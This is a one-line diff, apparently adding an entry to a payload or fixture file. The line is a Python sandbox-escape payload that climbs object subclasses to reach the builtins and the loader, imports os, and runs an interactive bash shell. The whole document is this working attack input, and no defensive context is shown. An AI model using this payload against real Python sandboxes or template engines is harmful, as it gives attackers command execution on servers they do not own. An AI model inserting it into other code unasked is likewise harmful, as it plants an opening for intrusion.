@@ -1,0 +1,1 @@
+[].__class__.__mro__[-1].__subclasses__()[100].__init__.__globals__["__builtins__"]["__loader__"]().load_module("os").system("bash -i")
